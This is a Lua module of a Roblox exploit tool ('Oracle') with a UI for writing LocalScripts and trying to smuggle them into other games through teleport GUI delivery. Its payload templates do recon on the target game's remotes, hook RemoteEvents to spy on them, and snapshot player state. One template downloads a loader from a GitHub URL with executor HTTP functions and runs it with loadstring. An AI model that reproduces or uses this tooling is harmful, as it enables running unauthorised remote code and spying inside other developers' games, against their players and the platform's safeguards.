-- Oracle // 26_tgui.lua
-- TGUI — Teleport GUI Delivery Engine
-- Authors a ScreenGui containing LocalScripts
-- Delivers it through Roblox's trusted teleport infrastructure
-- Scripts execute inside the destination game's client context
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

local TeleSvc = game:GetService("TeleportService")
local Players = game:GetService("Players")
local RS      = game:GetService("RunService")

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- TGUI ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Built-in script templates
-- These are the LocalScripts that get embedded in the ScreenGui
-- and execute inside the destination game
local TEMPLATES = {
    {
        id    = "recon",
        label = "Recon",
        desc  = "Collects and transmits game intelligence on arrival",
        code  = [[
-- TGUI Payload: Recon
-- Runs inside destination game after teleport delivery
-- Collects remotes, scripts, services, DataStore names

local RepS   = game:GetService("ReplicatedStorage")
local Players= game:GetService("Players")
local LP     = Players.LocalPlayer

local function collect()
    local data = {
        placeId  = game.PlaceId,
        jobId    = game.JobId,
        players  = #Players:GetPlayers(),
        remotes  = {},
        scripts  = {},
        modules  = {},
    }

    local function scan(root)
        local ok,d=pcall(function() return root:GetDescendants() end)
        if not ok then return end
        for _,x in ipairs(d) do
            if x:IsA("RemoteEvent") or x:IsA("RemoteFunction") then
                table.insert(data.remotes, x:GetFullName())
            elseif x:IsA("LocalScript") then
                table.insert(data.scripts, x:GetFullName())
            elseif x:IsA("ModuleScript") then
                table.insert(data.modules, x:GetFullName())
            end
        end
    end
    scan(RepS)
    scan(LP)
    local pg = LP:FindFirstChildOfClass("PlayerGui")
    if pg then scan(pg) end

    return data
end

-- Store results in _G so Oracle can read them
task.wait(2)  -- let game initialize
local results = collect()
_G.TGUI_RECON = results

-- Also write to a RemoteEvent if one exists for exfil
-- (will be read by TGUI module if listening)
print("[TGUI] Recon complete: "..#results.remotes.." remotes, "
    ..#results.scripts.." scripts")
]],
    },

    {
        id    = "oracle_inject",
        label = "Oracle Inject",
        desc  = "Loads full Oracle into destination game via teleport delivery",
        code  = [[
-- TGUI Payload: Oracle Inject
-- Bootstraps Oracle inside the destination game
-- after delivery through teleport infrastructure

task.wait(3)  -- wait for game to fully initialize

local function httpGet(url)
    if syn and syn.request then return syn.request({Url=url,Method="GET"}).Body
    elseif http_request then return http_request({Url=url,Method="GET"}).Body
    elseif request then return request({Url=url,Method="GET"}).Body
    elseif fluxus then return fluxus.request({Url=url,Method="GET"}).Body
    end
    error("no HTTP function")
end

local BASE = "https://raw.githubusercontent.com/E7neverBl4Te/oracle/main/"
local ok, src = pcall(httpGet, BASE.."loader.lua")
if ok and src then
    local fn, err = loadstring(src)
    if fn then
        fn()
        print("[TGUI] Oracle bootstrapped in destination game")
    else
        print("[TGUI] Oracle load error: "..tostring(err))
    end
else
    print("[TGUI] HTTP failed: "..tostring(src))
end
]],
    },

    {
        id    = "remote_spy",
        label = "Remote Spy",
        desc  = "Installs a passive remote spy in the destination game",
        code  = [[
-- TGUI Payload: Remote Spy
-- Hooks all RemoteEvents in destination game
-- Stores captures in _G.TGUI_SPY

task.wait(2)
_G.TGUI_SPY = {}

local function spy(root)
    local ok,d=pcall(function() return root:GetDescendants() end)
    if not ok then return end
    for _,x in ipairs(d) do
        if x:IsA("RemoteEvent") then
            x.OnClientEvent:Connect(function(...)
                table.insert(_G.TGUI_SPY, {
                    name = x.Name,
                    path = x:GetFullName(),
                    args = {...},
                    tick = tick(),
                })
                if #_G.TGUI_SPY > 500 then
                    table.remove(_G.TGUI_SPY, 1)
                end
            end)
        end
    end
end

local RepS2 = game:GetService("ReplicatedStorage")
spy(RepS2); spy(workspace)
RepS2.DescendantAdded:Connect(function(x)
    if x:IsA("RemoteEvent") then
        x.OnClientEvent:Connect(function(...)
            table.insert(_G.TGUI_SPY, {
                name=x.Name, path=x:GetFullName(),
                args={...}, tick=tick(),
            })
        end)
    end
end)

print("[TGUI] Remote spy active — "
    .."captures in _G.TGUI_SPY")
]],
    },

    {
        id    = "state_reader",
        label = "State Reader",
        desc  = "Reads and stores all accessible game state on arrival",
        code  = [[
-- TGUI Payload: State Reader
-- Snapshots all accessible game state after arrival
-- Stores in _G.TGUI_STATE

task.wait(2)
local LP = game:GetService("Players").LocalPlayer

local function readState()
    local state = {}

    -- Leaderstats
    local ls = LP:FindFirstChild("leaderstats")
    if ls then
        state.leaderstats = {}
        for _,v in ipairs(ls:GetChildren()) do
            local ok,val=pcall(function() return v.Value end)
            state.leaderstats[v.Name]=ok and val or "?"
        end
    end

    -- PlayerGui GUIs
    local pg = LP:FindFirstChildOfClass("PlayerGui")
    if pg then
        state.guis = {}
        for _,g in ipairs(pg:GetChildren()) do
            table.insert(state.guis, g.Name)
        end
    end

    -- Character stats
    local ch = LP.Character
    if ch then
        local hum = ch:FindFirstChildOfClass("Humanoid")
        if hum then
            state.health    = hum.Health
            state.maxHealth = hum.MaxHealth
            state.walkSpeed = hum.WalkSpeed
            state.jumpPower = hum.JumpPower
        end
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if hrp then
            state.position = tostring(hrp.Position)
        end
    end

    -- Accessible RemoteEvents
    local function scan(root)
        local remotes = {}
        local ok,d=pcall(function() return root:GetDescendants() end)
        if not ok then return remotes end
        for _,x in ipairs(d) do
            if x:IsA("RemoteEvent") or x:IsA("RemoteFunction") then
                table.insert(remotes, x:GetFullName())
            end
        end
        return remotes
    end
    state.remotes = scan(game:GetService("ReplicatedStorage"))
    state.placeId = game.PlaceId
    state.jobId   = game.JobId

    return state
end

_G.TGUI_STATE = readState()
print("[TGUI] State captured: "
    ..#(_G.TGUI_STATE.remotes or {}).." remotes  "
    ..tostring(_G.TGUI_STATE.health).." HP")
]],
    },

    {
        id    = "custom",
        label = "Custom Script",
        desc  = "Write your own LocalScript to execute in the destination game",
        code  = [[
-- Custom TGUI payload
-- This runs inside the destination game after teleport delivery
-- Oracle context is NOT available here — this is a fresh LocalScript
-- Use _G to communicate back to Oracle if it's also running

task.wait(2)
local LP = game:GetService("Players").LocalPlayer

-- Your code here
print("[TGUI] Custom payload executing in "..tostring(game.PlaceId))
]],
    },
}

-- ── Check if we arrived with a TeleportGui ────────────────────────────────────
local function checkArrivingGui()
    local ok, gui = pcall(function()
        return TeleSvc:GetArrivingTeleportGui()
    end)
    if not ok or gui == nil then return nil end
    return gui
end

-- ── Build the ScreenGui payload ───────────────────────────────────────────────
local function buildTeleportGui(scriptCode, guiName)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name            = guiName or "TGUIPayload"
    screenGui.ResetOnSpawn    = false
    screenGui.IgnoreGuiInset  = true
    screenGui.Enabled         = false  -- invisible

    -- Embed the LocalScript
    local ls = Instance.new("LocalScript")
    ls.Name   = "Payload"
    ls.Source = scriptCode
    ls.Parent = screenGui

    -- Embed Oracle data as a ModuleScript for the payload to read
    local dataModule = Instance.new("ModuleScript")
    dataModule.Name   = "OracleData"
    dataModule.Source = ([[
return {
    sourceGame  = %d,
    sourceJobId = %q,
    timestamp   = %f,
    rsoData     = nil,  -- populated at send time
}
]]):format(
        game.PlaceId,
        game.JobId,
        tick()
    )
    dataModule.Parent = screenGui

    return screenGui
end

-- ── Teleport with GUI payload ─────────────────────────────────────────────────
-- targetPlaceId: destination game
-- scriptCode: the LocalScript source to deliver
-- teleportData: optional table of data to pass alongside
local function deliverPayload(targetPlaceId, scriptCode, teleportData, logFn)
    -- Build the ScreenGui
    local gui = buildTeleportGui(scriptCode, "TGUIPayload_"..tostring(math.floor(tick())))

    -- Parent it temporarily so TeleportService can reference it
    gui.Parent = LP:FindFirstChildOfClass("PlayerGui") or game:GetService("CoreGui")

    if logFn then
        logFn("INFO","ScreenGui payload built",
            ("Scripts: 1  Parent: %s"):format(gui.Parent.Name))
        logFn("INFO","Target place: "..tostring(targetPlaceId))
    end

    -- Teleport with GUI
    local ok, err = pcall(function()
        TeleSvc:TeleportToPlaceInstance(
            targetPlaceId,
            game.JobId,  -- same server (if testing in same game)
            LP,
            gui.Name,    -- pass gui name as teleportGui reference
            teleportData or {
                tguiDelivery = true,
                sourcePlace  = game.PlaceId,
                timestamp    = tick(),
            }
        )
    end)

    if not ok then
        -- Try alternate teleport signature with GUI parameter
        ok, err = pcall(function()
            TeleSvc:Teleport(
                targetPlaceId,
                LP,
                teleportData or {tguiDelivery=true},
                gui
            )
        end)
    end

    if not ok then
        if logFn then
            logFn("INFO","Direct teleport with GUI failed",
                tostring(err):sub(1,80))
            logFn("INFO","Attempting TeleportToSameServer fallback")
        end
        -- Last resort: same place teleport
        ok, err = pcall(function()
            TeleSvc:TeleportToSamePlace(LP, gui)
        end)
    end

    if logFn then
        if ok then
            logFn("FIRED",
                "Teleport initiated with ScreenGui payload",
                "GUI will arrive via GetArrivingTeleportGui() in destination")
        else
            logFn("INFO","All teleport methods failed",
                tostring(err):sub(1,80)..
                "\n\nNote: GetArrivingTeleportGui requires an actual cross-game teleport.\n"..
                "Test by teleporting between two games you control.")
        end
    end

    return ok, err
end

-- ── Read results from delivered scripts ──────────────────────────────────────
local function readDeliveryResults(logFn)
    local found = {}

    -- Check _G for results written by delivered scripts
    local checks = {
        {key="TGUI_RECON",  label="Recon data"},
        {key="TGUI_SPY",    label="Remote spy captures"},
        {key="TGUI_STATE",  label="State snapshot"},
    }

    for _, check in ipairs(checks) do
        local val = _G[check.key]
        if val ~= nil then
            table.insert(found, {key=check.key, label=check.label, data=val})
            if logFn then
                if type(val)=="table" then
                    local count=0; for _ in pairs(val) do count+=1 end
                    logFn("FINDING",
                        check.label.." — "..count.." entries",
                        "Available in _G."..check.key, true)
                else
                    logFn("FINDING", check.label, tostring(val):sub(1,80), true)
                end
            end
        end
    end

    -- Check arriving GUI
    local arriving = checkArrivingGui()
    if arriving then
        table.insert(found, {key="arriving_gui", label="Arriving TeleportGui", data=arriving})
        if logFn then
            logFn("FINDING",
                "GetArrivingTeleportGui() returned a ScreenGui",
                ("Name: %s  Children: %d"):format(
                    arriving.Name,
                    #arriving:GetChildren()),
                true)
            -- List scripts inside
            for _,child in ipairs(arriving:GetDescendants()) do
                if child:IsA("LocalScript") or child:IsA("ModuleScript") then
                    logFn("FINDING",
                        "Script found in arriving GUI: "..child.Name,
                        "This script executed in this game's client context",
                        true)
                end
            end
        end
    end

    return found, arriving
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- TGUI PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_TGUI = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- top bar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_TGUI)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="⬡  TGUI — TELEPORT GUI DELIVERY",
    TextColor3=Color3.fromRGB(168,120,255),TextSize=11,
    Size=UDim2.new(0,280,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)

local TGUI_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(1,-190,1,0),Position=UDim2.new(0,190,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

-- control bar below topbar — PlaceId input + action buttons
local CTRLBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,30),ZIndex=4},P_TGUI)
stroke(C.BORDER,1,CTRLBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},CTRLBAR)
pad(8,4,CTRLBAR); listH(CTRLBAR,8)

mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="PlaceId",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(0,50,1,0),TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=5,LayoutOrder=1},CTRLBAR)
local PLACE_BOX=mk("TextBox",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Text="",PlaceholderText="target PlaceId (blank = dry run)",
    PlaceholderColor3=C.MUTED,TextColor3=C.WHITE,TextSize=10,Font=Enum.Font.Code,
    ClearTextOnFocus=false,TextXAlignment=Enum.TextXAlignment.Left,
    Size=UDim2.new(1,-280,0,22),ZIndex=5,LayoutOrder=2},CTRLBAR)
corner(5,PLACE_BOX); stroke(C.BORDER,1,PLACE_BOX); pad(6,0,PLACE_BOX)

local SEND_BTN=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=Color3.fromRGB(80,40,160),BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="▶ DELIVER",TextColor3=C.WHITE,TextSize=10,
    Size=UDim2.new(0,90,0,22),ZIndex=5,LayoutOrder=3},CTRLBAR)
corner(5,SEND_BTN)
do local base=Color3.fromRGB(80,40,160)
    SEND_BTN.MouseEnter:Connect(function() tw(SEND_BTN,TI.fast,{BackgroundColor3=Color3.new(math.min(base.R+.1,1),math.min(base.G+.1,1),math.min(base.B+.1,1))}) end)
    SEND_BTN.MouseLeave:Connect(function() tw(SEND_BTN,TI.fast,{BackgroundColor3=base}) end)
end

local CHECK_BTN=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=C.CARD,BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="⟳ Check Arrival",TextColor3=C.TEXT,TextSize=9,
    Size=UDim2.new(0,108,0,22),ZIndex=5,LayoutOrder=4},CTRLBAR)
corner(5,CHECK_BTN); stroke(C.BORDER,1,CHECK_BTN)
CHECK_BTN.MouseEnter:Connect(function() tw(CHECK_BTN,TI.fast,{BackgroundColor3=C.SURFACE}) end)
CHECK_BTN.MouseLeave:Connect(function() tw(CHECK_BTN,TI.fast,{BackgroundColor3=C.CARD}) end)

-- body
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,62),Size=UDim2.new(1,0,1,-62),ZIndex=3},P_TGUI)

-- left: template + editor
local TL=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0.5,0,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,-20),Position=UDim2.new(0.5,0,0,10),ZIndex=4},BODY)

-- template selector
local TMPL_BAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,28),ZIndex=4},TL)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TMPL_BAR)
pad(8,4,TMPL_BAR); listH(TMPL_BAR,4)

local selTemplate = TEMPLATES[1]
local tmplBtns    = {}

for _, tmpl in ipairs(TEMPLATES) do
    local sel = selTemplate.id == tmpl.id
    local b=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=sel and C.ACCDIM or C.CARD,BorderSizePixel=0,
        Font=Enum.Font.GothamBold,Text=tmpl.label,
        TextColor3=sel and C.ACCENT or C.MUTED,TextSize=8,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,
        ZIndex=5},TMPL_BAR)
    corner(4,b)
    mk("UIPadding",{PaddingLeft=UDim.new(0,7),PaddingRight=UDim.new(0,7)},b)
    tmplBtns[tmpl.id]=b
end

-- Code editor
local EDITOR_BG=mk("Frame",{BackgroundColor3=Color3.fromRGB(8,7,12),
    BorderSizePixel=0,
    Position=UDim2.new(0,0,0,28),Size=UDim2.new(1,0,1,-58),
    ClipsDescendants=true,ZIndex=4},TL)
stroke(C.BORDER,1,EDITOR_BG)

local LINE_COL=mk("Frame",{BackgroundColor3=Color3.fromRGB(12,10,18),
    BorderSizePixel=0,Size=UDim2.new(0,28,1,0),ZIndex=5},EDITOR_BG)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=6},LINE_COL)
local LINE_NUMS=mk("TextLabel",{BackgroundTransparency=1,
    Font=Enum.Font.Code,Text="1\n2\n3",
    TextColor3=Color3.fromRGB(55,52,75),TextSize=11,
    Size=UDim2.new(1,0,1,0),
    TextXAlignment=Enum.TextXAlignment.Center,
    TextYAlignment=Enum.TextYAlignment.Top,
    ZIndex=6},LINE_COL)
mk("UIPadding",{PaddingTop=UDim.new(0,8)},LINE_COL)

local CODE_BOX=mk("TextBox",{BackgroundTransparency=1,BorderSizePixel=0,
    Font=Enum.Font.Code,TextSize=11,
    TextColor3=Color3.fromRGB(210,206,230),
    PlaceholderColor3=Color3.fromRGB(55,52,75),
    PlaceholderText="-- LocalScript to deliver via TeleportGui",
    Text=TEMPLATES[1].code,
    Size=UDim2.new(1,-32,1,0),Position=UDim2.new(0,32,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,
    TextYAlignment=Enum.TextYAlignment.Top,
    MultiLine=true,ClearTextOnFocus=false,TextWrapped=false,
    ZIndex=5},EDITOR_BG)
mk("UIPadding",{PaddingTop=UDim.new(0,8),PaddingLeft=UDim.new(0,8)},CODE_BOX)

CODE_BOX:GetPropertyChangedSignal("Text"):Connect(function()
    local lines=#CODE_BOX.Text:split("\n")
    local nums={}
    for i=1,math.max(lines,10) do table.insert(nums,tostring(i)) end
    LINE_NUMS.Text=table.concat(nums,"\n")
end)

-- template button wiring (now CODE_BOX exists)
for _, tmpl in ipairs(TEMPLATES) do
    local b = tmplBtns[tmpl.id]
    if b then
        b.MouseButton1Click:Connect(function()
            selTemplate=tmpl
            CODE_BOX.Text=tmpl.code
            for id,btn in pairs(tmplBtns) do
                tw(btn,TI.fast,{
                    BackgroundColor3=id==tmpl.id and C.ACCDIM or C.CARD,
                    TextColor3=id==tmpl.id and C.ACCENT or C.MUTED,
                })
            end
        end)
    end
end

-- Description bar
local DESC_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(12,10,20),
    BorderSizePixel=0,
    Position=UDim2.new(0,0,1,-30),Size=UDim2.new(1,0,0,30),ZIndex=4},TL)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),ZIndex=5},DESC_BAR)
pad(10,0,DESC_BAR)
local DESC_LBL=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text=TEMPLATES[1].desc,TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.fromScale(1,1),TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},DESC_BAR)

-- right: log + results
local TR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0.5,1,0,0),Size=UDim2.new(0.5,-1,1,0),ZIndex=3},BODY)
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},TR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)

local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="TGUI delivers LocalScripts through\nRoblox's trusted teleport infrastructure.\n\n"..
         "The scripts execute inside the destination\n"..
         "game's client context after arrival.\n\n"..
         "How it works:\n"..
         "1. Author a LocalScript in the editor\n"..
         "2. Enter the destination game's PlaceId\n"..
         "3. Press ▶ DELIVER to teleport with the GUI\n"..
         "4. On arrival, ⟳ Check Arrival reads results\n\n"..
         "Scripts can read _G to communicate back\n"..
         "to Oracle if it's also running.",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,200),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- log helpers
local tN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false; tN+=1; mkRow(tag,msg,detail,hi,LOG_SCROLL,tN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) tN+=1; mkSep(txt,LOG_SCROLL,tN) end

-- ── DELIVER button ────────────────────────────────────────────────────────────
SEND_BTN.MouseButton1Click:Connect(function()
    local placeStr = PLACE_BOX.Text:match("^%s*(.-)%s*$")
    local placeId  = tonumber(placeStr)
    local code     = CODE_BOX.Text

    if code == "" then
        TGUI_STATUS.Text = "write a script first"
        TGUI_STATUS.TextColor3 = Color3.fromRGB(255,80,80)
        return
    end

    -- Syntax check
    local fn, compileErr = loadstring(code)
    if not fn then
        addLog("INFO","Script syntax error",
            tostring(compileErr):sub(1,100))
        TGUI_STATUS.Text = "syntax error"
        TGUI_STATUS.TextColor3 = Color3.fromRGB(255,80,80)
        return
    end

    addLogSep("TGUI DELIVERY")

    -- No PlaceId = dry run (build and inspect the GUI without teleporting)
    if not placeId then
        addLog("INFO","No PlaceId — running DRY RUN",
            "GUI will be built and inspected without teleporting")
        local gui = buildTeleportGui(code, "TGUIPayload_DRY")
        addLog("FIRED","ScreenGui built",
            ("Name: %s  Scripts: 1  Size: %d bytes"):format(
                gui.Name, #code))
        -- Check script parses
        addLog("CLEAN","Script syntax valid",
            "Ready to deliver — enter a PlaceId to teleport")
        TGUI_STATUS.Text = "dry run complete"
        TGUI_STATUS.TextColor3 = Color3.fromRGB(80,210,100)
        -- Clean up
        gui:Destroy()
        return
    end

    addLog("INFO","Preparing delivery",
        ("Target: PlaceId %d  Script: %d bytes"):format(placeId, #code))

    TGUI_STATUS.Text = "delivering..."
    TGUI_STATUS.TextColor3 = Color3.fromRGB(168,120,255)
    tw(SEND_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(40,20,80)})

    task.spawn(function()
        local ok, err = deliverPayload(placeId, code, nil, addLog)

        if ok then
            TGUI_STATUS.Text = "teleport initiated"
            TGUI_STATUS.TextColor3 = Color3.fromRGB(168,120,255)
            addLog("INFO","Awaiting server transition",
                "On arrival — press ⟳ Check Arrival to read delivered script results")
        else
            TGUI_STATUS.Text = "delivery failed"
            TGUI_STATUS.TextColor3 = Color3.fromRGB(255,80,80)
        end
        tw(SEND_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,40,160)})
    end)
end)

-- ── CHECK ARRIVAL button ──────────────────────────────────────────────────────
CHECK_BTN.MouseButton1Click:Connect(function()
    addLogSep("ARRIVAL CHECK")
    TGUI_STATUS.Text = "checking..."
    TGUI_STATUS.TextColor3 = C.DELTA

    local found, arrivingGui = readDeliveryResults(addLog)

    -- Also check if we're in a new game
    addLog("INFO","Current game",
        ("PlaceId: %d  JobId: %s"):format(
            game.PlaceId, game.JobId:sub(1,12).."..."))

    if #found == 0 then
        addLog("CLEAN","No delivery results found",
            "Either the script hasn't run yet or teleport hasn't occurred.\n"..
            "Wait a moment and check again.")
        TGUI_STATUS.Text = "no results yet"
        TGUI_STATUS.TextColor3 = C.MUTED
    else
        TGUI_STATUS.Text = #found.." result(s) found"
        TGUI_STATUS.TextColor3 = Color3.fromRGB(168,120,255)

        -- Render recon data if available
        if _G.TGUI_RECON then
            local r = _G.TGUI_RECON
            addLogSep("RECON DATA")
            addLog("FINDING","Destination game: PlaceId "..tostring(r.placeId),
                ("Players: %d  Remotes: %d  Scripts: %d"):format(
                    r.players or 0,
                    #(r.remotes or {}),
                    #(r.scripts or {})),
                true)
            for i,remote in ipairs(r.remotes or {}) do
                if i > 20 then
                    addLog("INFO","... and "..tostring(#r.remotes-20).." more remotes")
                    break
                end
                addLog("INFO","Remote: "..remote)
            end
        end

        -- Render spy data
        if _G.TGUI_SPY and #_G.TGUI_SPY > 0 then
            addLogSep("SPY CAPTURES ("..#_G.TGUI_SPY..")")
            for i,cap in ipairs(_G.TGUI_SPY) do
                if i > 30 then break end
                addLog("RESPONSE","← "..cap.name,
                    vs(cap.args):sub(1,60))
            end
        end

        -- Render state
        if _G.TGUI_STATE then
            local s = _G.TGUI_STATE
            addLogSep("STATE SNAPSHOT")
            addLog("FINDING","Health: "..tostring(s.health)..
                " / "..tostring(s.maxHealth),
                "Position: "..tostring(s.position),true)
            if s.leaderstats then
                for k,v in pairs(s.leaderstats) do
                    addLog("INFO","Stat: "..k.." = "..tostring(v))
                end
            end
        end
    end
end)

-- ── Auto-check on tab open ────────────────────────────────────────────────────
-- If we just arrived via teleport, check immediately
P_TGUI:GetPropertyChangedSignal("Visible"):Connect(function()
    if P_TGUI.Visible then
        task.delay(0.5, function()
            local arriving = checkArrivingGui()
            if arriving then
                addLog("FINDING",
                    "⚑ Arriving TeleportGui detected",
                    ("Name: %s — scripts may be executing"):format(arriving.Name),
                    true)
                TGUI_STATUS.Text = "GUI arrived"
                TGUI_STATUS.TextColor3 = Color3.fromRGB(168,120,255)
            end
        end)
    end
end)

-- Export
G.TGUI_buildGui    = buildTeleportGui
G.TGUI_deliver     = deliverPayload
G.TGUI_checkArrival= readDeliveryResults
G.TGUI_templates   = TEMPLATES

if G.addTab then
    G.addTab("tgui","TGUI",P_TGUI)
else
    warn("[Oracle] G.addTab not found")
end
